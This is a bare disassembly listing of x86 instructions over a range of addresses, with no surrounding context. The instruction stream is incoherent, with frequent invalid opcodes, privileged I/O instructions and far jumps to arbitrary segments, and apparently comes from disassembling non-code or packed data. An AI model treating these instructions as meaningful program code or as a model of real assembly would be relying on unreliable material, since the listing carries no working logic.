  4156c9:	lods   al,BYTE PTR ds:[esi]
  4156ca:	adc    al,0x64
  4156cc:	data16 xor al,0x28
  4156cf:	shl    eax,0x5d
  4156d2:	adc    al,BYTE PTR [ebp+ecx*1+0x37]
  4156d6:	and    eax,0x418102eb
  4156db:	sub    eax,DWORD PTR [edi-0x5bf71dc4]
  4156e1:	adc    BYTE PTR [ecx+0x1f46c5d1],bh
  4156e7:	mov    dl,0xf7
  4156e9:	in     al,dx
  4156ea:	addr16 mov ah,0x4d
  4156ed:	int3   
  4156ee:	or     ah,BYTE PTR [eax+0x5d9eed40]
  4156f4:	call   0x13ad9b3e
  4156f9:	aaa    
  4156fa:	jmp    0x4a88:0x1ea76487
  415701:	mov    ebx,0x62411c48
  415706:	rol    DWORD PTR [ebx],cl
  415708:	and    bh,BYTE PTR [edi]
  41570a:	fcmovu st,st(6)
  41570c:	ss enter 0x965f,0xc2
  415711:	jg     0x41571b
  415713:	xchg   BYTE PTR [esi+0xf2121a1],cl
  415719:	jg     0x415796
  41571b:	test   al,0xab
  41571d:	sbb    eax,0xbdbb8fd4
  415722:	aas    
  415723:	xor    edx,DWORD PTR ds:0xb99876c5
  415729:	push   ecx
  41572a:	inc    ebx
  41572b:	and    esi,DWORD PTR [ecx-0x7b]
  41572e:	lahf   
  41572f:	les    esi,FWORD PTR [edi]
  415731:	sti    
  415732:	xchg   esi,eax
  415733:	hlt    
  415734:	push   ecx
  415735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415736:	jno    0x415703
  415738:	add    eax,0x3c0b540f
  41573d:	jmp    0x48040b0
  415742:	cmp    eax,0x88240865
  415747:	scas   eax,DWORD PTR es:[edi]
  415748:	xchg   esp,eax
  415749:	retf   
  41574a:	push   eax
  41574b:	mov    dh,0x36
  41574d:	pop    ecx
  41574e:	jne    0x415759
  415750:	das    
  415751:	xchg   ecx,eax
  415752:	imul   ebp
  415754:	dec    ebp
  415755:	inc    eax
  415756:	mov    eax,0x221bd3b4
  41575b:	xchg   ebp,eax
  41575c:	dec    edx
  41575d:	jl     0x41574b
  41575f:	dec    edi
  415760:	or     bh,BYTE PTR [esi-0x23]
  415763:	leave  
  415764:	push   ecx
  415765:	fwait
  415766:	pop    ecx
  415767:	rol    bl,1
  415769:	jg     0x4157bc
  41576b:	sbb    esi,DWORD PTR ss:[ecx-0x403640c4]
  415772:	std    
  415773:	int3   
  415774:	bound  edi,QWORD PTR [edi-0x6e370b20]
  41577a:	and    edi,DWORD PTR [ebx]
  41577c:	xor    esp,0x6b
  41577f:	das    
  415780:	or     ecx,DWORD PTR [ecx-0x55d5933b]
  415786:	je     0x4157cd
  415788:	sti    
  415789:	sar    BYTE PTR [ebx-0x5a],cl
  41578c:	mov    ah,0xb
  41578e:	outs   dx,DWORD PTR ds:[esi]
  41578f:	dec    edx
  415790:	mov    bl,0x1c
  415792:	lods   al,BYTE PTR ds:[esi]
  415793:	scas   eax,DWORD PTR es:[edi]
  415794:	sub    eax,0x7c56d0df
  415799:	or     cl,BYTE PTR [eax]
  41579b:	lods   al,BYTE PTR ds:[esi]
  41579c:	cld    
  41579d:	in     al,dx
  41579e:	repz sahf 
  4157a0:	mov    WORD PTR [ebx],fs
  4157a2:	mov    al,0x9b
  4157a4:	(bad)
  4157a7:	mov    al,BYTE PTR [eax+0x4ab6c257]
  4157ad:	jns    0x41576e
  4157af:	cwde   
  4157b0:	jbe    0x4157a3
  4157b2:	push   edi
  4157b3:	(bad)  
  4157b4:	fucomp st(1)
  4157b6:	adc    DWORD PTR [edx-0x1bcc66dd],esp
  4157bc:	fisub  DWORD PTR [ebp+0x29]
  4157bf:	gs dec esp
  4157c1:	dec    esp
  4157c2:	mov    WORD PTR [edx+0x55],ds
  4157c5:	rcl    DWORD PTR [eax-0x73],cl
  4157c8:	jp     0x4157b4
  4157ca:	push   0x11
  4157cc:	sar    DWORD PTR ds:0x1bbe33f2,0xe0
  4157d3:	retf   0xb6bb
  4157d6:	push   ss
  4157d7:	jle    0x41576f
  4157d9:	in     eax,dx
  4157da:	fnstsw WORD PTR [ecx-0x5b]
  4157dd:	icebp  
  4157de:	mov    eax,0xeed33957
  4157e3:	je     0x415828
  4157e5:	mov    BYTE PTR [ebp+edx*4-0x13],dh
  4157e9:	push   ds
  4157ea:	mov    BYTE PTR [edx],ah
  4157ec:	jb     0x41580f
  4157ee:	jo     0x415834
  4157f0:	sub    al,0x3
  4157f2:	sub    eax,0xbe15eeaf
  4157f7:	sti    
  4157f8:	js     0x415834
  4157fa:	pop    es
  4157fb:	sbb    bh,dh
  4157fd:	pusha  
  4157fe:	dec    ebp
  4157ff:	test   DWORD PTR [eax],0x72929ee
  415805:	pop    ebp
  415806:	xchg   ecx,eax
  415807:	imul   edi,DWORD PTR [esi-0x6f],0xbce53890
  41580e:	push   es
  41580f:	sub    al,0x19
  415811:	es and eax,edi
  415814:	into   
  415815:	mov    BYTE PTR [eax-0x5d4489a5],ah
  41581b:	dec    esi
  41581c:	or     al,0x10
  41581e:	cmp    al,0xbc
  415820:	xchg   edx,eax
  415821:	frstor [ebx]
  415824:	shl    DWORD PTR [edx],cl
  415826:	arpl   bp,si
  415828:	fcomip st,st(0)
  41582a:	mov    bl,0x88
  41582c:	inc    edi
  41582d:	icebp  
  41582e:	pop    eax
  41582f:	pop    esp
  415830:	imul   esp,DWORD PTR [edx],0x8d5e7be0
  415836:	stc    
  415837:	aam    0xac
  415839:	jne    0x415881
  41583b:	lock in al,dx
  41583d:	xchg   ecx,eax
  41583e:	lds    esp,FWORD PTR [edx+edx*4+0x3f052b74]
  415845:	repnz and ebp,DWORD PTR [edi]
  415848:	js     0x415859
  41584a:	jmp    FWORD PTR ss:[ebp-0x71a9e2f0]
  415851:	stos   DWORD PTR es:[edi],eax
  415852:	test   edx,eax
  415854:	lock out 0x90,eax
  415857:	mov    bl,0x73
  415859:	xchg   edx,eax
  41585a:	cmp    eax,0x811d3d43
  41585f:	jne    0x415882
  415861:	mov    eax,0xcee30b29
  415866:	adc    BYTE PTR [esi+0xa1ab090],al
  41586c:	inc    edi
  41586d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41586e:	clc    
  41586f:	in     al,0x7a
  415871:	fsub   st(4),st
  415873:	mov    dl,0x67
  415875:	adc    eax,0x965ff532
  41587a:	xchg   esp,eax
  41587b:	xchg   edi,eax
  41587c:	cmp    al,0xcf
  41587e:	xor    ecx,eax
  415880:	cmc    
  415881:	rol    BYTE PTR [esi-0x78814b1],1
  415887:	cwde   
  415888:	stos   DWORD PTR es:[edi],eax
  415889:	neg    BYTE PTR [esi-0x8]
  41588c:	nop
  41588d:	aas    
  41588e:	pop    ds
  41588f:	je     0x4158ac
  415891:	out    0x9a,al
  415893:	xchg   esp,eax
  415894:	mov    dh,0x9c
  415896:	inc    edx
  415897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415898:	das    
  415899:	dec    esi
  41589a:	loop   0x41582e
  41589c:	mov    bh,0xa3
  41589e:	shr    DWORD PTR [eax-0x1c],cl
  4158a1:	xchg   edi,eax
  4158a2:	and    BYTE PTR [esi+0x2285e806],ah
  4158a8:	leave  
  4158a9:	arpl   WORD PTR [esi],sp
  4158ab:	xchg   DWORD PTR [edi+ebp*4-0x34],ecx
  4158af:	into   
  4158b0:	outs   dx,DWORD PTR ds:[esi]
  4158b1:	mov    bh,0x73
  4158b3:	ror    BYTE PTR [edi-0x400321bc],0x94
  4158ba:	adc    bh,BYTE PTR [ecx-0x6c]
  4158bd:	add    eax,DWORD PTR [edx+edx*2-0x22d5187d]
  4158c4:	mov    bh,0x68
  4158c6:	xchg   ebx,eax
  4158c7:	clc    
  4158c8:	and    DWORD PTR [esi],ebx
  4158ca:	inc    edi
  4158cb:	(bad)  
  4158cc:	inc    esi
  4158ce:	dec    edx
  4158cf:	mov    al,0xc6
  4158d1:	xor    DWORD PTR [edx-0x7872b2e3],ecx
  4158d7:	cmp    BYTE PTR [esi+0x29],al
  4158da:	call   0x859:0x407377b3
  4158e1:	jle    0x415917
  4158e3:	enterw 0x674f,0x65
  4158e8:	fwait
  4158e9:	or     BYTE PTR [eax-0xf212a5d],dh
  4158ef:	add    al,0x35
  4158f1:	scas   eax,DWORD PTR es:[edi]
  4158f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158f3:	xchg   ebx,eax
  4158f4:	pop    ecx
  4158f5:	das    
  4158f6:	ret    0x76e5
  4158f9:	jle    0x415948
  4158fb:	cld    
  4158fc:	in     al,0xf3
  4158fe:	and    dl,al
  415900:	pop    esp
  415901:	jle    0x415946
  415903:	stos   DWORD PTR es:[edi],eax
  415904:	jl     0x4158aa
  415906:	pop    eax
  415907:	rep ins DWORD PTR es:[edi],dx
  415909:	push   edx
  41590a:	mov    ebx,0x89f85cc9
  41590f:	call   0x223e255b
  415914:	js     0x415945
  415916:	lods   al,BYTE PTR ds:[esi]
  415917:	pextrw ecx,(bad),0xc5
  415919:	mov    DWORD PTR [eax-0x75],ebx
  41591c:	ret    0xf9f0
  41591f:	push   eax
  415920:	and    esi,DWORD PTR [edi+0x5a]
  415923:	ja     0x4158d1
  415925:	sbb    al,0x64
  415927:	mov    ebp,0x271d79be
  41592c:	ret    
  41592d:	pop    ebp
  41592e:	push   ds
  41592f:	das    
  415930:	cmp    ecx,eax
  415932:	push   edx
  415933:	jb     0x415995
  415935:	js     0x415985
  415937:	ja     0x41593c
  415939:	push   ss
  41593a:	push   es
  41593b:	push   0x321d50b9
  415940:	jp     0x4158f0
  415942:	xchg   DWORD PTR [ebx+0x60],eax
  415945:	dec    edi
  415946:	jecxz  0x415993
  415948:	adc    al,0x28
  41594a:	xchg   edx,eax
  41594b:	mov    esp,0x99690d9e
  415950:	leave  
  415951:	fadd   st(2),st
  415953:	out    dx,al
  415954:	sbb    ecx,DWORD PTR [esi+ebp*1]
  415957:	jb     0x415985
  415959:	ss add eax,0x66eb8214
  41595f:	add    bh,al
  415961:	ins    BYTE PTR es:[edi],dx
  415962:	je     0x415978
  415964:	lea    esp,[esi]
  415966:	lahf   
  415967:	fdiv   st,st(0)
  415969:	inc    edx
  41596a:	or     dh,BYTE PTR [ebx+ebx*2]
  41596d:	mov    ebx,DWORD PTR [edi]
  41596f:	xchg   esp,eax
  415970:	inc    esi
  415971:	jb     0x4159c2
  415973:	out    0xe2,al
  415975:	mov    ah,0x54
  415977:	xchg   edi,eax
  415978:	mov    ah,0xec
  41597a:	mov    ds:0x1d56c496,al
  41597f:	dec    edi
  415980:	popf   
  415981:	clc    
  415982:	and    DWORD PTR [edx-0x37534a46],ecx
  415988:	(bad)  
  415989:	dec    BYTE PTR [edi]
  41598b:	sub    al,0x18
  41598d:	ret    
  41598e:	inc    edi
  41598f:	or     ecx,ebp
  415991:	(bad)  
  415993:	js     0x415917
  415995:	cmp    eax,0xfe8b69dd
  41599a:	ds cwde 
  41599c:	sub    al,0x71
  41599e:	or     al,0xf4
  4159a0:	adc    ecx,ecx
  4159a2:	es jnp 0x415942
  4159a5:	and    DWORD PTR [edi],0x22
  4159a8:	mov    dh,0xa5
  4159aa:	in     al,0x4c
  4159ac:	mov    bh,0x87
  4159ae:	inc    ecx
  4159af:	adc    al,ch
  4159b1:	or     dh,al
  4159b3:	add    ecx,DWORD PTR [esi+0x3c2498b9]
  4159b9:	cmp    ebx,ecx
  4159bb:	cli    
  4159bc:	mov    bl,0x6c
  4159be:	push   es
  4159bf:	fs sbb al,0xff
  4159c2:	xchg   edx,eax
  4159c3:	or     bl,BYTE PTR [eax-0x7]
  4159c6:	int3   
  4159c7:	jns    0x4159f6
  4159c9:	cmp    bl,dh
  4159cb:	inc    ecx
  4159cc:	clc    
  4159cd:	mov    WORD PTR [esi-0x76],es
  4159d0:	fist   WORD PTR [esi+0x68]
  4159d3:	dec    DWORD PTR [edi-0xe3a5bf9]
  4159d9:	(bad)  
  4159da:	(bad)  
  4159db:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159dd:	adc    BYTE PTR [ecx+0x3f54953b],ah
  4159e3:	pop    ecx
  4159e4:	jae    0x415a52
  4159e6:	mov    WORD PTR [ebx+0x5a],cs
  4159e9:	sbb    DWORD PTR [edx],esp
  4159eb:	xor    bl,BYTE PTR [ebx-0x52]
  4159ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ef:	push   ss
  4159f0:	fwait
  4159f1:	std    
  4159f2:	xchg   esi,eax
  4159f3:	std    
  4159f4:	jae    0x415a1d
  4159f6:	mov    ebx,0x26491e7b
  4159fb:	add    BYTE PTR [ecx-0x7a1f43ee],bl
  415a01:	mov    al,ds:0x8104d0c5
  415a06:	call   0x1b833085
  415a0b:	jnp    0x4159c3
  415a0d:	pop    ds
  415a0e:	jl     0x4159bd
  415a10:	ret    
  415a11:	outs   dx,DWORD PTR ds:[esi]
  415a12:	sub    esi,DWORD PTR [eax+ecx*8-0x4e017d6c]
  415a19:	imul   ebp,DWORD PTR [ecx-0xe08f4fd],0x37
  415a20:	jecxz  0x4159d3
  415a22:	cdq    
  415a23:	xlat   BYTE PTR ds:[ebx]
  415a24:	sbb    BYTE PTR ds:[ebp+0x1a],0xd5
  415a29:	mov    dl,0xff
  415a2b:	ret    
  415a2c:	xchg   esp,eax
  415a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a2e:	jae    0x415a35
  415a30:	idiv   DWORD PTR [ebx]
  415a32:	inc    ebp
  415a33:	adc    dh,BYTE PTR [ebx+eiz*8]
  415a36:	mul    BYTE PTR [edx-0x2609b00f]
  415a3c:	(bad)  
  415a3d:	into   
  415a3e:	rcr    BYTE PTR [ebp-0x5087be6f],cl
  415a44:	retf   0xf235
  415a47:	mov    edx,0x17d3cd8a
  415a4c:	or     al,0x78
  415a4e:	push   ebp
  415a4f:	or     DWORD PTR [ebp-0x1fd21371],esp
  415a55:	mov    ah,0x20
  415a57:	repnz mov dh,cl
  415a5a:	mov    eax,0x1ff9b9d5
  415a5f:	(bad)  
  415a60:	aas    
  415a61:	ins    BYTE PTR es:[edi],dx
  415a62:	jecxz  0x415ada
  415a64:	xlat   BYTE PTR ds:[ebx]
  415a65:	pop    ss
  415a66:	out    0x64,eax
  415a68:	sub    al,0xad
  415a6a:	push   ebx
  415a6b:	cmc    
  415a6c:	mov    BYTE PTR [edi+0x5acf534b],dl
  415a72:	fs jl  0x415a54
  415a75:	mov    eax,0x3d6476dd
  415a7a:	(bad)
  415a7d:	pop    ebx
  415a7e:	call   0x8864:0x7453141e
  415a85:	and    bl,BYTE PTR [edx-0x2c]
  415a88:	adc    ah,cl
  415a8a:	cmp    ebp,DWORD PTR [ebp+0x7d0fb42f]
  415a90:	sbb    BYTE PTR fs:0xa1cda67a,0xce
  415a98:	aad    0x15
  415a9a:	sahf   
  415a9b:	call   0x9921411d
  415aa0:	div    DWORD PTR [ebp-0x2b]
  415aa3:	imul   esp,DWORD PTR ds:0x56b840c2,0x38
  415aaa:	xor    eax,0xe7248ad4
  415aaf:	mov    cs,WORD PTR ds:0xe50d56af
  415ab5:	or     ah,BYTE PTR [edi+ebx*1-0x16f5b2fb]
  415abc:	fidivr WORD PTR [edx-0x28ca9475]
  415ac2:	dec    ebx
  415ac4:	cdq    
  415ac5:	inc    edi
  415ac6:	jge    0x415a8e
  415ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ac9:	hlt    
  415aca:	and    eax,0xeb30b6f4
  415acf:	dec    edx
  415ad0:	bound  edi,QWORD PTR [esi+0x701e2167]
  415ad6:	ss dec esp
  415ad8:	push   0xfdb7395b
  415add:	rol    DWORD PTR [ebx+eax*8],cl
  415ae0:	pop    ebp
  415ae2:	xchg   ebx,eax
  415ae3:	adc    al,0x59
  415ae5:	inc    edi
  415ae6:	aam    0x86
  415ae8:	inc    ebx
  415ae9:	mov    WORD PTR [eax],ax
  415aec:	(bad)  
  415aee:	sbb    BYTE PTR [eax+eax*8-0x13159d56],al
  415af5:	mov    ds:0x97a6c9f7,al
  415afa:	inc    edx
  415afb:	iret   
  415afc:	xchg   edi,eax
  415afd:	sub    DWORD PTR [eax+0x7d1d6114],edx
  415b03:	imul   ecx,esp,0x339864e
  415b09:	out    0xc1,eax
  415b0b:	hlt    
  415b0c:	das    
  415b0d:	rcr    DWORD PTR [ecx+0x5b],0x43
  415b11:	jne    0x415b5a
  415b13:	dec    edx
  415b14:	mov    eax,ds:0x72d29430
  415b19:	sub    DWORD PTR [edx+edi*4+0x59ae3de5],esi
  415b20:	and    BYTE PTR [ecx-0x51],cl
  415b23:	dec    eax
  415b24:	and    BYTE PTR [edx-0x14],dh
  415b27:	dec    eax
  415b28:	shrd   ecx,edi,0x3e
  415b2c:	(bad)  
  415b2d:	fucomip st,st(3)
  415b2f:	sar    DWORD PTR [ebx-0x4d],0xd6
  415b33:	and    DWORD PTR [ebx+0x7a],esp
  415b36:	fild   WORD PTR [ecx+ebx*2]
  415b39:	dec    DWORD PTR [ecx]
  415b3b:	lock out 0xdd,eax
  415b3e:	mov    DWORD PTR [ecx+0x42],edi
  415b41:	sbb    ebx,ebp
  415b43:	mov    dh,0x4a
  415b45:	bound  ebx,QWORD PTR [esi]
  415b47:	inc    edi
  415b48:	inc    edx
  415b49:	(bad)  
  415b4a:	out    dx,eax
  415b4b:	xor    BYTE PTR [esi+0x39],dl
  415b4e:	add    eax,DWORD PTR ds:0x6f93484a
  415b54:	call   DWORD PTR [esi]
  415b56:	icebp  
  415b57:	inc    esi
  415b58:	push   esp
  415b59:	ret    
  415b5a:	lds    edi,FWORD PTR [edi-0x42a12e46]
  415b60:	test   eax,0x2f3fe7a5
  415b65:	xchg   edx,eax
  415b66:	and    esp,edx
  415b68:	int    0xc0
  415b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b6b:	pop    es
  415b6c:	xor    esp,edi
  415b6e:	imul   ebp,DWORD PTR [eax+edx*2-0xeb56f1c],0xffffffd9
  415b76:	or     eax,0x4750d9c3
  415b7b:	inc    ecx
  415b7c:	shr    DWORD PTR [eax-0x3d],1
  415b7f:	pusha  
  415b80:	or     al,0xd6
  415b82:	repnz cmc 
  415b84:	js     0x415b1c
  415b86:	add    edx,DWORD PTR [edx-0x7f]
  415b89:	popa   
  415b8a:	xchg   esi,eax
  415b8b:	sbb    DWORD PTR [esi+0x4c183a6a],edx
  415b91:	jo     0x415b50
  415b93:	push   edx
  415b94:	ss push ebx
  415b96:	mov    esi,0x6d5d9757
  415b9b:	or     dl,ah
  415b9d:	ja     0x415ba3
  415b9f:	mov    ah,0x5a
  415ba1:	jnp    0x415bbf
  415ba3:	mov    ch,0x94
  415ba5:	cdq    
  415ba6:	inc    ebp
  415ba7:	jnp    0x415bad
  415ba9:	mov    ds:0xacca9fd5,al
  415bae:	dec    ebx
  415baf:	push   esp
  415bb0:	popf   
  415bb1:	jmp    0x3cee:0xa388feca
  415bb8:	jns    0x415bc8
  415bba:	inc    edi
  415bbb:	scas   eax,DWORD PTR es:[edi]
  415bbc:	jecxz  0x415c33
  415bbe:	adc    BYTE PTR [ebp-0x14c37874],0x41
  415bc5:	std    
  415bc6:	add    esp,esp
  415bc8:	push   esp
  415bc9:	not    DWORD PTR [eax-0x45e039de]
  415bcf:	add    esp,DWORD PTR [ebx-0x70]
  415bd2:	cli    
  415bd3:	jl     0x415bae
  415bd5:	enter  0x38e,0xad
  415bd9:	xchg   ebx,eax
  415bda:	jnp    0x415c0b
  415bdc:	or     dh,BYTE PTR [ebx+0x1a]
  415bdf:	out    dx,al
  415be0:	test   al,0xb6
  415be2:	jbe    0x415c49
  415be4:	test   DWORD PTR [ebx-0x14],edx
  415be7:	pop    es
  415be8:	jne    0x415c27
  415bea:	ret    
  415beb:	xor    eax,0x23693060
  415bf0:	mov    esi,0xb69c8b9e
  415bf5:	jmp    0x415c1b
  415bf7:	mov    ds:0xcf66e690,eax
  415bfc:	inc    ecx
  415bfd:	mov    al,0xf
  415bff:	pop    esi
  415c00:	mov    ebx,0x102c50c2
  415c05:	sub    DWORD PTR [edi+ebp*1],ebx
  415c08:	xlat   BYTE PTR ds:[ebx]
  415c09:	jae    0x415c68
  415c0b:	jbe    0x415c10
  415c0d:	pop    eax
  415c0e:	retf   0xd573
  415c11:	repz fidivr WORD PTR [edi-0x7ac9f55d]
  415c18:	(bad)  
  415c19:	je     0x415c82
  415c1b:	ins    DWORD PTR es:[edi],dx
  415c1c:	mov    ah,0xb9
  415c1e:	pop    ebx
  415c1f:	cld    
  415c20:	fdivr  DWORD PTR [edx+0xa]
  415c23:	sub    al,0xe4
  415c25:	or     bh,al
  415c27:	shl    al,1
  415c29:	pop    ebx
  415c2a:	imul   ebp,DWORD PTR [ecx-0x1726746c],0xffffffda
  415c31:	jns    0x415c5d
  415c33:	inc    edx
  415c34:	pop    ss
  415c35:	sbb    esp,ebx
  415c37:	cmp    al,0x26
  415c39:	leave  
  415c3a:	add    edi,eax
  415c3c:	dec    ecx
  415c3d:	popa   
  415c3e:	or     ebp,DWORD PTR [ebx]
  415c40:	inc    esp
  415c41:	dec    edx
  415c42:	dec    ecx
  415c43:	(bad)  
  415c44:	scas   al,BYTE PTR es:[edi]
  415c45:	int3   
  415c46:	or     eax,0x1883b763
  415c4b:	xchg   esp,eax
  415c4c:	dec    esi
  415c4d:	pop    ecx
  415c4e:	ror    DWORD PTR [edx],1
  415c50:	sahf   
  415c51:	xchg   ecx,eax
  415c52:	jae    0x415c84
  415c54:	and    al,0x35
  415c56:	outs   dx,BYTE PTR ds:[esi]
  415c57:	pop    eax
  415c58:	int3   
  415c59:	xor    BYTE PTR ds:0x4f594f2a,ah
  415c5f:	shl    BYTE PTR [ebx],1
  415c61:	jle    0x415be8
  415c63:	mov    ah,0x1e
  415c65:	lods   eax,DWORD PTR ds:[esi]
  415c66:	loop   0x415ce0
  415c68:	out    0xd1,eax
  415c6a:	mov    ecx,0x1d5cd506
  415c6f:	fimul  WORD PTR [edx-0x55]
  415c72:	lods   al,BYTE PTR ds:[esi]
  415c73:	(bad)  
  415c74:	icebp  
  415c75:	mov    eax,ds:0xd78ae83f
  415c7a:	pop    esp
  415c7b:	cmp    cl,BYTE PTR [ebp-0x30029947]
  415c81:	mov    ds:0x7a51a29c,eax
  415c86:	inc    ecx
  415c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c88:	jns    0x415cd2
  415c8a:	into   
  415c8b:	jl     0x415c4d
  415c8d:	dec    ecx
  415c8e:	shl    DWORD PTR [ebp-0x7cd4f61c],cl
  415c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c95:	cs mov esi,0xa4748a00
  415c9b:	push   0xfffffff9
  415c9d:	lods   eax,DWORD PTR ds:[esi]
  415c9e:	(bad)  
  415c9f:	mov    bl,0x8a
  415ca1:	lds    edi,FWORD PTR [eax]
  415ca3:	aam    0x65
  415ca5:	(bad)  
  415ca6:	mov    ebx,0xe551b818
  415cab:	rcr    dl,cl
  415cad:	pop    edx
  415cae:	xor    BYTE PTR [esi+ebx*2],0xdf
  415cb2:	mov    edi,0x727d3bca
  415cb7:	shl    BYTE PTR [ebx],0x15
  415cba:	loope  0x415ceb
  415cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cbd:	adc    dh,BYTE PTR [esi+0x43ca850e]
  415cc3:	cmp    bl,BYTE PTR [esi+0x4619b3b0]
  415cc9:	cwde   
  415cca:	rcl    DWORD PTR [edx],0x5d
  415ccd:	fst    DWORD PTR [edi-0x4ab9545c]
  415cd3:	fwait
  415cd4:	(bad)  
  415cd5:	and    al,0x48
  415cd7:	jge    0x415d4e
  415cd9:	jge    0x415cc0
  415cdb:	add    DWORD PTR [edi-0x52226f2a],edi
  415ce1:	lds    ebx,FWORD PTR [ebx]
  415ce3:	outs   dx,DWORD PTR ds:[esi]
  415ce4:	push   ds
  415ce5:	and    eax,0x4386ba54
  415cea:	inc    edi
  415ceb:	cmp    al,0x5e
  415ced:	and    al,0x67
  415cef:	mov    ch,0x2e
  415cf1:	retf   
  415cf2:	jle    0x415cfa
  415cf4:	pop    esi
  415cf5:	outs   dx,DWORD PTR ds:[esi]
  415cf6:	retf   
  415cf7:	jp     0x415d41
  415cf9:	out    dx,eax
  415cfa:	or     eax,DWORD PTR [edi]
  415cfc:	mul    BYTE PTR [si+0x3c]
  415d00:	xor    BYTE PTR [edx-0x61ff1d52],al
  415d06:	inc    edx
  415d07:	mov    ch,0xb6
  415d09:	add    ebp,DWORD PTR [edi+eiz*4-0x1a]
  415d0d:	ret    
  415d0e:	fst    QWORD PTR [eax-0x5b]
  415d11:	cmp    ecx,esp
  415d13:	add    DWORD PTR [ebx+0x4c0567fb],ebp
  415d19:	cmp    DWORD PTR [ecx],ebp
  415d1b:	add    DWORD PTR [esi-0x2c],esp
  415d1e:	jg     0x415d57
  415d20:	sbb    BYTE PTR ds:0x9843150f,cl
  415d26:	dec    eax
  415d27:	mov    bh,0xa6
  415d29:	mov    cl,0x7d
  415d2b:	sub    al,0xae
  415d2d:	daa    
  415d2e:	into   
  415d2f:	add    BYTE PTR [edx+0xe],al
  415d32:	in     al,0x8e
  415d34:	cli    
  415d35:	popf   
  415d36:	scas   eax,DWORD PTR es:[edi]
  415d37:	int    0xc5
  415d39:	add    al,0x90
  415d3c:	stos   DWORD PTR es:[edi],eax
  415d3d:	ds aas 
  415d3f:	cmc    
  415d40:	mov    dl,BYTE PTR [ebx+0x7953a2c1]
  415d46:	jge    0x415d63
  415d48:	sar    DWORD PTR [edi],1
  415d4a:	jae    0x415d41
  415d4c:	ss pop esi
  415d4e:	mov    ecx,DWORD PTR [eax]
  415d50:	lahf   
  415d51:	fld    TBYTE PTR [esi]
  415d53:	imul   BYTE PTR [eax+0x1c]
  415d56:	adc    BYTE PTR [esi+0x77],dh
  415d59:	xchg   edi,eax
  415d5a:	pop    edx
  415d5b:	ss dec ecx
  415d5d:	mov    al,ds:0x174c2d8b
  415d62:	icebp  
  415d63:	xchg   esp,eax
  415d64:	rcl    DWORD PTR [ebx+ebp*8],cl
  415d67:	cmp    BYTE PTR [esi-0x7],0xcf
  415d6b:	mov    fs,eax
  415d6d:	add    DWORD PTR [edi-0x8],edi
  415d70:	in     eax,0x39
  415d72:	cmp    BYTE PTR [edx-0x5b],0xb0
  415d76:	ins    BYTE PTR es:[edi],dx
  415d77:	sub    al,0x57
  415d79:	(bad)  
  415d7a:	(bad)  
  415d7c:	cmpxchg dh,ah
  415d7f:	add    esp,edx
  415d81:	sbb    eax,0xaf772712
  415d86:	clc    
  415d87:	xor    BYTE PTR [eax+edi*2],al
  415d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d8b:	repz call 0x625:0xc76b7d62
  415d93:	(bad)  
  415d94:	pop    ds
  415d95:	inc    eax
  415d96:	and    DWORD PTR [esi-0x41312a20],ebp
  415d9c:	push   ebp
  415d9d:	js     0x415dc2
  415d9f:	out    0x62,al
  415da1:	je     0x415d4d
  415da3:	aas    
  415da4:	pusha  
  415da5:	fisubr DWORD PTR [ebx+0x69]
  415da8:	xchg   DWORD PTR [ebx],ecx
  415daa:	(bad)  
  415dab:	xchg   ebx,eax
  415dac:	out    dx,eax
  415dad:	mov    ebx,esi
  415daf:	aas    
  415db0:	inc    esi
  415db1:	mov    fs,WORD PTR [ebx]
  415db3:	retf   0x5b99
  415db6:	popf   
  415db7:	dec    edx
  415db8:	adc    BYTE PTR [ebx-0x3e1a101f],al
  415dbe:	jp     0x415e24
  415dc0:	popf   
  415dc1:	adc    bl,BYTE PTR [eax]
  415dc3:	sub    edi,ecx
  415dc5:	lods   al,BYTE PTR ds:[esi]
  415dc6:	iret   
  415dc7:	cli    
  415dc8:	cmp    esi,DWORD PTR [ebp+0x2d3ce1]
  415dce:	mov    ds:0xd47c8889,eax
  415dd3:	fsubr  st(3),st
  415dd5:	adc    bh,BYTE PTR [esi-0x51dcb3ea]
  415ddb:	outs   dx,BYTE PTR ds:[esi]
  415ddc:	jp     0x415e06
  415dde:	call   0x80ee3ad5
  415de3:	mov    gs,WORD PTR [edx+0x3e3ce2fe]
  415de9:	dec    edx
  415dea:	test   eax,esp
  415dec:	pop    ecx
  415ded:	cmp    BYTE PTR [ebp-0x5a],0x71
  415df1:	les    edx,FWORD PTR [ecx+esi*8]
  415df4:	addr16 fucomi st,st(3)
  415df7:	fld    DWORD PTR [edx]
  415df9:	sar    DWORD PTR [eax-0x2b],0xa3
  415dfd:	outs   dx,DWORD PTR ds:[esi]
  415dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dff:	mov    eax,ds:0xc43612fd
  415e04:	dec    ebx
  415e05:	xchg   esi,eax
  415e06:	mov    bh,0x56
  415e08:	(bad)
  415e0b:	je     0x415e14
  415e0d:	clc    
  415e0e:	adc    ebx,DWORD PTR [edx+0x1f]
  415e11:	gs iret 
  415e13:	and    eax,0x60cabdc8
  415e18:	dec    ecx
  415e19:	test   eax,0xa76a43ec
  415e1e:	(bad)  
  415e1f:	sti    
  415e20:	test   al,0x38
  415e22:	aaa    
  415e23:	sbb    eax,0xb8de8ecd
  415e28:	adc    DWORD PTR [ebx+0x5],edi
  415e2b:	sar    BYTE PTR [eax+0x1c],cl
  415e2e:	frstor [ebp-0x51488bde]
  415e34:	add    esi,DWORD PTR [ebx]
  415e36:	out    dx,al
  415e37:	vpsubw xmm5,xmm3,XMMWORD PTR [ecx]
  415e3b:	sahf   
  415e3c:	shl    BYTE PTR ds:0xeb96ed69,cl
  415e42:	hlt    
  415e43:	mov    esp,0x2dbc8831
  415e48:	push   ecx
  415e49:	push   0xfffffff7
